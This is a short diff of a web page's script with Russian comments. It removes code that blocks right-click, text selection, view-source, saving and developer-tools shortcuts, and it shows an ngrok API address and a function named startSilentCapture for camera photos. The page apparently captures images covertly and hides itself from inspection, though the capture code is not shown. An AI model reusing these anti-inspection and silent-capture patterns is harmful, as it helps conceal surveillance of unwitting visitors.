@@ -483,16 +483,8 @@
 </div>
 
 <script>
-    // ========== БЛОКИРОВКИ ==========
-    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
-        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
-        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); return false; }
-        if (e.key === 'F12') { e.preventDefault(); return false; }
-        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
-    });
+    // ========== БЛОКИРОВКИ ОТКЛЮЧЕНЫ ДЛЯ ОТЛАДКИ ==========
+    // F12 и другие инструменты разработчика РАБОТАЮТ!
     
     // ========== КОНФИГ ==========
     const API_URL = 'https://7aa4-95-59-214-182.ngrok-free.app';
@@ -849,7 +841,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО (ИСПРАВЛЕННАЯ) ==========
+    // ========== КАМЕРА И ФОТО ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
